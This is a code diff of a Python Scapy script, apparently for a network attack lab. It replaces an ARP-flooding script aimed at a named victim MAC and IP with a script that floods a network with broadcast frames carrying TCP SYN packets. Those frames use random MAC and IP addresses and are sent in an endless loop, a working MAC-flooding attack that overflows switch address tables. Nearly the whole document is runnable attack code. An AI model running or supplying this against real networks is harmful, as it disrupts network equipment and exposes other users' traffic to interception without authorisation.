@@ -1,25 +1,22 @@
-from scapy.all import *
-from scapy.layers.inet import *
-import random
-import socket
-import struct
-import time
+nbpkts = 8192
+iface = "eth0"
 
-victim = "08:00:27:2c:a9:08"
-victim_ip = "192.168.20.71"
-my_ip = "192.168.20.11"
-generated=0
-packets=[]
-how_many_packet=5000
-def generate_some_packets(qta):
-	for i in range(qta):
-		generated_mac=RandMAC()
-		packet=(Ether(dst=victim,src=generated_mac)/ARP(op=1,psrc=my_ip,pdst=victim_ip,hwsrc=generated_mac))
-		packets.append(packet)
-	
-generate_some_packets(how_many_packet)
+import sys
+from scapy.all import sendpfast, Ether, IP, RandIP, RandMAC, TCP
 
-for i in range(how_many_packet):
-	if i % 100 == 0 :
-		print(i)
-	sendp(packets[i],verbose=0)
+print("Initializing...")
+
+# We first build all packets...
+pkts = []
+for i in xrange(0, nbpkts):
+  macaddr = str(RandMAC())
+  # registered by the switches.
+  pkts.append(Ether(src=macaddr, dst="ff:ff:ff:ff:ff:ff")/
+              IP(src=str(RandIP()), dst=str(RandIP()))/
+              TCP(dport=80, flags="S", options=[('Timestamp', (0, 0))]))
+
+print("Launching attack, press Ctrl+C to stop...")
+
+# ...and then we send them in loop.
+while True:
+  sendpfast(pkts, iface=iface, file_cache=True, pps=5000, loop=999)
